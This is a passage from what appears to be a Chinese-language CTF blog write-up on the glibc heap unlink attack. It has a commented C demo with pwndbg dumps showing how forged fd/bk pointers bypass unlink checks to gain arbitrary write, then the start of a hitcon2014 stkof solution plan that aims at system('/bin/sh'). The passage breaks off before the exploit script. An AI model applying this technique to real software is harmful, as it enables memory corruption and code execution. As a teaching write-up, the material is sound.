class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">//gcc</span> <span class="string">-g</span> <span class="string">demo.c</span> <span class="string">-no-pie</span> <span class="string">-o</span> <span class="string">demo</span></span><br><span class="line"><span class="string">struct</span> <span class="string">chunk_structure</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="string">size_t</span> <span class="string">prev_size;</span></span><br><span class="line">  <span class="string">size_t</span> <span class="string">size;</span></span><br><span class="line">  <span class="string">struct</span> <span class="string">chunk_structure</span> <span class="string">*fd;</span></span><br><span class="line">  <span class="string">struct</span> <span class="string">chunk_structure</span> <span class="string">*bk;</span></span><br><span class="line">  <span class="string">char</span> <span class="string">buf[10];</span>               <span class="string">//</span> <span class="string">padding</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"> </span><br><span class="line"><span class="string">int</span> <span class="string">main()</span> <span class="string">&#123;</span></span><br><span class="line">  <span class="string">unsigned</span> <span class="string">long</span> <span class="string">long</span> <span class="string">*chunk1,</span> <span class="string">*chunk2;</span></span><br><span class="line">  <span class="string">struct</span> <span class="string">chunk_structure</span> <span class="string">*fake_chunk,</span> <span class="string">*chunk2_hdr;</span></span><br><span class="line">  <span class="string">char</span> <span class="string">data[20];</span></span><br><span class="line"> </span><br><span class="line">  <span class="string">//首先申请两个</span> <span class="string">不是</span> <span class="string">fast</span> <span class="string">的chunk</span></span><br><span class="line">  <span class="string">chunk1</span> <span class="string">=</span> <span class="string">malloc(0x80);</span></span><br><span class="line">  <span class="string">chunk2</span> <span class="string">=</span> <span class="string">malloc(0x80);</span></span><br><span class="line">  <span class="string">printf("%p\n",</span> <span class="string">&amp;chunk1);</span>            <span class="string">//0x7fffffffdcb0</span></span><br><span class="line">  <span class="string">printf("%p\n",</span> <span class="string">chunk1);</span>             <span class="string">//0x602010</span></span><br><span class="line">  <span class="string">printf("%p\n",</span> <span class="string">chunk2);</span>             <span class="string">//0x6020a0</span></span><br><span class="line"><span class="string">//假设攻击者可以控制了chunk1的内容</span></span><br><span class="line"><span class="string">//溢出堆，覆盖chunk2的头</span></span><br><span class="line"><span class="string">//首先从chunk1开始伪造一个假块</span></span><br><span class="line"><span class="string">//需要设置fd和bk指针通过unlink安全检查</span></span><br><span class="line">  <span class="string">fake_chunk</span> <span class="string">=</span> <span class="string">(struct</span> <span class="string">chunk_structure</span> <span class="string">*)chunk1;</span>             <span class="string">//伪造</span> <span class="string">chunk</span> <span class="string">：0x7fffffffdcc0</span> <span class="string">—▸</span> <span class="number">0x602010</span><span class="string">&lt;-0</span>    <span class="string">//这里</span> <span class="string">&amp;chunk1_mem:</span> <span class="number">0x7fffffffdcb0</span> <span class="string">—▸</span> <span class="number">0x602010</span> <span class="string">◂—</span> <span class="number">0x0</span></span><br><span class="line">                                                             <span class="string">//</span> <span class="string">即</span> <span class="string">指向</span>  <span class="number">0x602010</span> <span class="string">这个伪造chunk的</span> <span class="string">指针</span> <span class="string">有两个，而</span> <span class="string">在下面都给</span> <span class="string">用成了</span> <span class="string">&amp;chunk1_mem_ptr：</span> <span class="number">0x7fffffffdcb0</span></span><br><span class="line">  <span class="string">fake_chunk-&gt;fd</span> <span class="string">=</span> <span class="string">(struct</span> <span class="string">chunk_structure</span> <span class="string">*)(&amp;fake_chunk</span> <span class="bullet">-</span> <span class="number">3</span><span class="string">);</span> <span class="string">//</span> <span class="string">Ensures</span> <span class="string">P-&gt;fd-&gt;bk</span> <span class="string">==</span> <span class="string">P</span></span><br><span class="line">  <span class="string">fake_chunk-&gt;bk</span> <span class="string">=</span> <span class="string">(struct</span> <span class="string">chunk_structure</span> <span class="string">*)(&amp;fake_chunk</span> <span class="bullet">-</span> <span class="number">2</span><span class="string">);</span> <span class="string">//</span> <span class="string">Ensures</span> <span class="string">P-&gt;bk-&gt;fd</span> <span class="string">==</span> <span class="string">P</span></span><br><span class="line">  <span class="string">/*</span> </span><br><span class="line">  </span><br><span class="line">  <span class="string">"FD-&gt;bk != P || BK-&gt;fd != P"</span> </span><br><span class="line">  </span><br><span class="line">  <span class="string">此时的FD</span> <span class="string">是</span> <span class="string">*(fake_chunk-&gt;fd)</span> <span class="string">即</span> <span class="string">*(fake_chunk+0x10)</span></span><br><span class="line">       <span class="string">BK</span> <span class="string">是</span> <span class="string">*(fake_chunk-&gt;bk)</span> <span class="string">即</span> <span class="string">*(fake_chunk+0x18)</span></span><br><span class="line">       </span><br><span class="line">  <span class="string">如果</span> <span class="string">*(*(fake_chunk+0x10)</span> <span class="string">+0x18)</span> <span class="string">不是fake_chunk</span> <span class="string">或者*(*(fake_chunk+0x18)+0x10)不是fake_chunk</span> <span class="string">,会爆错："corrupted</span> <span class="string">double-linked</span> <span class="string">list"</span></span><br><span class="line"><span class="string">//绕过姿势:</span>  <span class="string">我们使</span>   <span class="string">*(fake_chunk+0x10)是</span>  <span class="string">&amp;fake_chunk-0x18</span> <span class="string">；*(fake_chunk+0x18)是</span> <span class="string">&amp;fake_chunk-0x10</span></span><br><span class="line">            <span class="string">即</span>            <span class="string">FD</span> <span class="string">==</span>  <span class="string">&amp;fake_chunk-0x18</span>                   <span class="string">BK==</span>  <span class="string">&amp;fake_chunk-0x10</span>      </span><br><span class="line">            </span><br><span class="line"><span class="string">p</span> <span class="string">是</span> <span class="string">&amp;fake_chunk</span>   <span class="string">即</span>  <span class="number">0x7fffffffdcb0</span>          <span class="string">//下面的</span> <span class="string">&amp;fake_chunk都</span> <span class="string">用</span>  <span class="string">&amp;chunk1_mem_ptr：</span> <span class="number">0x7fffffffdcb0</span> <span class="string">替换了</span></span><br><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">hex(0x7fffffffdcb0-0x18)</span>          </span><br><span class="line"><span class="string">+0000</span> <span class="number">0x7fffffffdc98</span>  </span><br><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">hex(0x7fffffffdcb0-0x10)</span></span><br><span class="line"><span class="string">+0000</span> <span class="number">0x7fffffffdca0</span>  </span><br><span class="line"></span><br><span class="line">                                    <span class="string">/----</span> <span class="string">FD</span> <span class="string">=</span> <span class="string">&amp;chunk1_mem_ptr-0x18</span> </span><br><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">x/10gx</span> <span class="number">0x602010</span>           <span class="string">/</span> </span><br><span class="line"><span class="attr">0x602010:</span> <span class="number">0x0000000000000000</span>   <span class="string">/</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="attr">0x602020:</span> <span class="number">0x00007fffffffdc98</span> <span class="string">&lt;-</span>   <span class="number">0x00007fffffffdca0</span>  <span class="string">&lt;-------</span>  <span class="string">BK=&amp;chunk1_mem_ptr-0x10</span>    </span><br><span class="line"><span class="attr">0x602030:</span> <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="attr">0x602040:</span> <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="attr">0x602050:</span> <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"></span><br><span class="line"><span class="string">我们此时</span> <span class="string">再来看下</span> <span class="string">是否可以通过"corrupted</span> <span class="string">double-linked</span> <span class="string">list"</span> <span class="string">报错检查：</span></span><br><span class="line"><span class="string">"FD-&gt;bk != P || BK-&gt;fd != P"</span>                           <span class="string">这里的P</span> <span class="string">是</span> <span class="string">chunk1</span> <span class="number">0x602010</span></span><br><span class="line"><span class="string">*(*(p+0x10)</span> <span class="string">+0x18)</span> <span class="string">不是chunk1</span> <span class="string">或者*(*(p+0x18)+0x10)不是</span> <span class="string">chunk1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">x/6gx</span> <span class="number">0x602010</span></span><br><span class="line"><span class="attr">0x602010:</span> <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="attr">0x602020:</span> <span class="number">0x00007fffffffdc98</span><span class="string">--</span>  <span class="number">0x00007fffffffdca0</span><span class="string">----\</span></span><br><span class="line"><span class="attr">0x602030:</span> <span class="number">0x0000000000000000</span>  <span class="string">\</span> <span class="number">0x0000000000000000</span>     <span class="string">|</span></span><br><span class="line">                                 <span class="string">\_______</span>                 <span class="string">|</span></span><br><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">x/10gx</span> <span class="number">0x00007fffffffdc98</span> <span class="string">&lt;——————|</span>  <span class="string">/—————————————/</span>  </span><br><span class="line"><span class="attr">0x7fffffffdc98:</span> <span class="number">0x00007ffff7ffe168</span>     <span class="string">/</span> <span class="number">0x0000000000000003</span>      <span class="string">/</span> <span class="string">-----</span>  <span class="string">*(*(p+0x10)</span> <span class="string">+0x18)</span> <span class="string">等于fake_chunk</span> <span class="number">0x602010</span></span><br><span class="line"><span class="attr">0x7fffffffdca8:</span> <span class="number">0x00000000004006db</span>    <span class="string">/</span> <span class="number">0x0000000000602010</span> <span class="string">&lt;---/</span>  </span><br><span class="line"><span class="attr">0x7fffffffdcb8:</span> <span class="number">0x00000000006020a0</span>    <span class="string">|</span> <span class="number">0x0000000000602010</span></span><br><span class="line"><span class="attr">0x7fffffffdcc8:</span> <span class="number">0x0000000000000000</span>  <span class="string">__|0x00000000004007e0</span></span><br><span class="line"><span class="attr">0x7fffffffdcd8:</span> <span class="number">0x0000000000400570</span>  <span class="string">|</span>   <span class="number">0x00007fffffffddd0</span></span><br><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">x/10gx</span> <span class="number">0x00007fffffffdca0</span> <span class="string">&lt;————/</span>    <span class="string">_______________________</span> <span class="string">————————</span>   <span class="string">*(*(p+0x18)+0x10)等于</span> <span class="string">fake_chunk</span>  <span class="number">0x602010</span></span><br><span class="line"><span class="attr">0x7fffffffdca0:</span> <span class="number">0x0000000000000003</span>   <span class="string">/</span>  <span class="number">0x00000000004006db</span></span><br><span class="line"><span class="attr">0x7fffffffdcb0:</span> <span class="number">0x0000000000602010</span><span class="string">&lt;-/</span> <span class="number">0x00000000006020a0</span></span><br><span class="line"><span class="attr">0x7fffffffdcc0:</span> <span class="number">0x0000000000602010</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="attr">0x7fffffffdcd0:</span> <span class="number">0x00000000004007e0</span>  <span class="number">0x0000000000400570</span></span><br><span class="line"><span class="attr">0x7fffffffdce0:</span> <span class="number">0x00007fffffffddd0</span>  <span class="number">0x6bb29f2ece5d7700</span></span><br><span class="line"><span class="string">发现成功绕过检查。</span></span><br><span class="line"></span><br><span class="line"> <span class="string">*/</span></span><br><span class="line">  </span><br><span class="line">  <span class="string">//</span> <span class="string">接下来修改chunk2的头以通过所有安全检查</span></span><br><span class="line">  <span class="string">chunk2_hdr</span> <span class="string">=</span> <span class="string">(struct</span> <span class="string">chunk_structure</span> <span class="string">*)(chunk2</span> <span class="bullet">-</span> <span class="number">2</span><span class="string">);</span></span><br><span class="line">  <span class="string">chunk2_hdr-&gt;prev_size</span> <span class="string">=</span> <span class="number">0x80</span><span class="string">;</span>  <span class="string">//</span> <span class="string">chunk1's</span> <span class="string">data</span> <span class="string">region</span> <span class="string">size</span>   <span class="string">伪造chunk的</span> <span class="string">size</span></span><br><span class="line">  <span class="string">chunk2_hdr-&gt;size</span> <span class="string">&amp;=</span> <span class="string">~1;</span>        <span class="string">//</span> <span class="string">Unsetting</span> <span class="string">prev_in_use</span> <span class="string">bit</span>   <span class="string">设置</span> <span class="string">prev_size中的</span> <span class="string">inuse</span> <span class="string">位</span> <span class="string">置为</span> <span class="number">0</span> </span><br><span class="line">  </span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string">chunksize(P)</span> <span class="string">!=</span> <span class="string">prev_size</span> <span class="string">(next_chunk(P)),</span> <span class="number">0</span><span class="string">))</span></span><br><span class="line"> <span class="string">如果</span> <span class="string">该chunk的size</span> <span class="string">和</span> <span class="string">下一个chunk</span> <span class="string">的prev_size相等的话。会爆错："corrupted</span> <span class="string">size</span> <span class="string">vs.</span> <span class="string">prev_size"</span>        </span><br><span class="line"> <span class="string">绕过姿势:</span> <span class="string">修改使得</span>  <span class="string">该chunk的size</span> <span class="string">和</span> <span class="string">下一个chunk</span> <span class="string">的prev_size相等</span> <span class="string">即可</span> </span><br><span class="line"> <span class="string">*/</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="string">//</span> <span class="string">Now,</span> <span class="string">when</span> <span class="string">chunk2</span> <span class="string">is</span> <span class="string">freed,</span> <span class="string">attacker's</span> <span class="string">fake</span> <span class="string">chunk</span> <span class="string">is</span> <span class="string">'unlinked'</span></span><br><span class="line">  <span class="string">//</span> <span class="string">This</span> <span class="string">results</span> <span class="string">in</span> <span class="string">chunk1</span> <span class="string">pointer</span> <span class="string">pointing</span> <span class="string">to</span> <span class="string">chunk1</span> <span class="bullet">-</span> <span class="number">3</span></span><br><span class="line">  <span class="string">//</span> <span class="string">i.e.</span> <span class="string">chunk1[3]</span> <span class="string">now</span> <span class="string">contains</span> <span class="string">chunk1</span> <span class="string">itself.</span></span><br><span class="line">  <span class="string">//</span> <span class="string">We</span> <span class="string">then</span> <span class="string">make</span> <span class="string">chunk1</span> <span class="string">point</span> <span class="string">to</span> <span class="string">some</span> <span class="string">victim's</span> <span class="string">data</span></span><br><span class="line">  <span class="string">free(chunk2);</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">                                <span class="string">//</span>     <span class="string">FD</span> <span class="string">=</span> <span class="string">fake_chunk-&gt;fd;</span>     <span class="string">//即</span> <span class="string">FD=fake_chunk+0x10</span>                                                                     </span><br><span class="line">                                <span class="string">//</span>     <span class="string">BK</span> <span class="string">=</span> <span class="string">chunk_chunk-&gt;bk;</span>    <span class="string">//即</span> <span class="string">BK=fake_chunk+0x18</span>    </span><br><span class="line">                               <span class="string">//绕过姿势:</span>  <span class="string">我们使</span>  <span class="string">*(fake_chunk+0x10)是</span>  <span class="string">&amp;fake_chunk-0x18</span> <span class="string">；*(fake_chunk+0x18)是</span> <span class="string">&amp;fake_chunk-0x10</span></span><br><span class="line">                               <span class="string">//</span>        <span class="string">即</span>          <span class="string">FD</span> <span class="string">==</span>  <span class="string">&amp;fake_chunk-0x18</span>             <span class="string">BK==</span>  <span class="string">&amp;fake_chunk-0x10</span>           <span class="string">//&amp;fake_chunk</span>  <span class="string">其实是</span> <span class="meta">&amp;chunk1_mem_ptr</span></span><br><span class="line">                                                                               </span><br><span class="line">                <span class="string">FD-&gt;bk</span> <span class="string">=</span> <span class="string">BK;</span>     <span class="string">//</span> <span class="string">FD+0x18=&amp;fake_chunk-0x10</span>      <span class="string">即*(&amp;fake_chunk-0x18+0x18)=&amp;fake_chunk-0x10</span>                                              </span><br><span class="line">                <span class="string">BK-&gt;fd</span> <span class="string">=</span> <span class="string">FD;</span>     <span class="string">//</span> <span class="string">BK+0x10=&amp;fake_chunk-0x18</span>      <span class="string">即*(&amp;fake_chunk-0x10</span> <span class="string">+0x10)=&amp;fake_chunk-0x18</span>     <span class="string">//关键</span> </span><br><span class="line">                </span><br><span class="line">                            <span class="string">//所以</span> <span class="string">攻击后，</span>       <span class="string">*(&amp;fake_chunk)</span>  <span class="string">=&amp;fake_chunk-0x10</span>  </span><br><span class="line">                            <span class="string">//</span> <span class="string">然后</span> <span class="string">又被重新赋值</span>  <span class="string">*(&amp;fake_chunk)</span>  <span class="string">=&amp;fake_chunk-0x18</span>        <span class="string">//再次</span> <span class="string">强调</span> <span class="string">&amp;fake_chunk其实现在是</span>  <span class="meta">&amp;chunk1_mem_ptr</span></span><br><span class="line">                            <span class="string">//即</span>  <span class="string">unlink</span> <span class="string">后</span> <span class="string">&amp;fake_chunk中的</span> <span class="string">值</span> <span class="string">由</span> <span class="number">0x602010</span> <span class="string">变为了</span>  <span class="string">&amp;fake_chunk-0x18</span> <span class="string">即</span> <span class="number">0x7fffffffdcb0</span><span class="number">-0x18</span> <span class="string">==</span> <span class="number">0x7fffffffdc98</span></span><br><span class="line">                            <span class="string">即</span>  <span class="string">chunk1</span> <span class="string">变为了</span> <span class="number">0x7fffffffdcb0</span><span class="number">-0x18</span> <span class="string">==</span> <span class="number">0x7fffffffdc98</span></span><br><span class="line"><span class="string">pwndbg&gt;</span> <span class="string">x/10gx</span> <span class="number">0x7fffffffdc98</span><span class="string">------------------------------------------------|</span></span><br><span class="line"><span class="attr">0x7fffffffdc98:</span> <span class="number">0x0000000000400570</span>  <span class="number">0x00007fffffffddd0</span>                <span class="string">/</span></span><br><span class="line"><span class="attr">0x7fffffffdca8:</span> <span class="number">0x000000000040073d</span>  <span class="number">0x00007fffffffdc98</span> <span class="string">&lt;--------------</span></span><br><span class="line"><span class="attr">0x7fffffffdcb8:</span> <span class="number">0x00000000006020a0</span>  <span class="number">0x0000000000602010</span></span><br><span class="line"><span class="attr">0x7fffffffdcc8:</span> <span class="number">0x0000000000602090</span>  <span class="number">0x00000000004007e0</span></span><br><span class="line"><span class="attr">0x7fffffffdcd8:</span> <span class="number">0x0000000000400570</span>  <span class="number">0x00007fffffffddd0</span></span><br><span class="line"></span><br><span class="line">  <span class="string">printf("%p\n",</span> <span class="string">chunk1);</span>       <span class="string">//0x7fffffffdc98</span></span><br><span class="line">  <span class="string">printf("%x\n",</span> <span class="string">chunk1[3]);</span>    <span class="string">//ffffdc98</span>    </span><br><span class="line">  <span class="string">chunk1[3]</span> <span class="string">=</span> <span class="string">(unsigned</span> <span class="string">long</span> <span class="string">long)data;</span></span><br><span class="line">  <span class="string">strcpy(data,</span> <span class="string">"Victim's data"</span><span class="string">);</span></span><br><span class="line">  <span class="string">//</span> <span class="string">Overwrite</span> <span class="string">victim's</span> <span class="string">data</span> <span class="string">using</span> <span class="string">chunk1</span></span><br><span class="line">  <span class="string">chunk1[0]</span> <span class="string">=</span> <span class="string">0x002164656b636168LL;</span>  <span class="string">//hacked!</span></span><br><span class="line">  <span class="string">printf("%s\n",</span> <span class="string">data);</span>   <span class="string">//hacked!</span></span><br><span class="line">  <span class="string">return</span> <span class="number">0</span><span class="string">;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h1 id="相关题目：unlink-hitcon2014-stkof"><a href="#相关题目：unlink-hitcon2014-stkof" class="headerlink" title="相关题目：unlink_hitcon2014_stkof"></a>相关题目：unlink_hitcon2014_stkof</h1><p>这题 回显 有些少哦！<br>查看保护：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Arch:</span>     amd64<span class="number">-64</span>-little</span><br><span class="line"><span class="symbol">    RELRO:</span>    Partial RELRO              <span class="comment">//不是 full relro </span></span><br><span class="line"><span class="symbol">    Stack:</span>    Canary found</span><br><span class="line"><span class="symbol">    NX:</span>       NX enabled</span><br><span class="line"><span class="symbol">    PIE:</span>      No PIE (<span class="number">0x400000</span>)          <span class="comment">//no pie</span></span><br></pre></td></tr></table></figure><p>程序流程：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="selector-class">.add</span>， 2<span class="selector-class">.edit</span>，3<span class="selector-class">.delete</span>，4<span class="selector-class">.useless</span></span><br></pre></td></tr></table></figure><p>1.add：  malloc(size)  size无限制</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">add_400936</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 <span class="built_in">size</span>; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">size</span> = atoll(&amp;s);</span><br><span class="line">  v2 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  Structure_array[++i] = v2;         <span class="comment">//++i  下标为 1 处开始 存</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i, <span class="built_in">size</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.edit： 向chunk_mem_addr 指向内容 写入 无限制 长度 内容</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">edit_4009E8</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> index; <span class="comment">// [rsp+8h] [rbp-88h]</span></span><br><span class="line">  __int64 len; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+18h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);                    <span class="comment">// 输入 结构体数组 下标</span></span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  index = atol(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( index &gt; <span class="number">0x100000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( !Structure_array[index] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  len = atoll(&amp;s);</span><br><span class="line">  ptr = Structure_array[index];                 <span class="comment">// 向 Structure_array[index] 数组len 字节 内容</span></span><br><span class="line">  <span class="keyword">for</span> ( i = fread(ptr, <span class="number">1u</span>LL, len, <span class="built_in">stdin</span>); i &gt; <span class="number">0</span>; i = fread(ptr, <span class="number">1u</span>LL, len, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr += i;</span><br><span class="line">    len -= i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( len )</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.delete： 无 UAF</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">delete_400B07</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v1 = atol(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0x100000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( !Structure_array[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="built_in">free</span>(Structure_array[v1]);            <span class="comment">// 内容删除</span></span><br><span class="line">  Structure_array[v1] = <span class="number">0L</span>L;            <span class="comment">//指针清零</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.useless：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">sub_400BA9</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> index; <span class="comment">// [rsp+Ch] [rbp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  index = atol(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( index &gt; <span class="number">0x100000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( !Structure_array[index] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Structure_array[index]) &lt;= <span class="number">3</span> )    <span class="comment">// 判断 Structure_array[index] 中内容长度是否 小于等于 3</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"//TODO"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"..."</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h1><p>存在堆溢出，知道全局结构体数组地址， got 可改，</p><p>首先 先得到两个 chunk 物理位置相邻，<br><br>这里的话就是 #2 和 #3<br><br>在#2中伪造一个chunk   改#3的 prev_size 和size的inuse位<br><br>free (#3) 会触发 #2进入unlink<br><br>unlink的结果是 &amp;chunk2 中的存的是 &amp;chunk2-0x10<br></p><p>然后想办法 执行 system(/bin/sh\x00)<br><br>然后我们首先得得到 libc_base<br></p><p>可通过向 #2中 写入</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 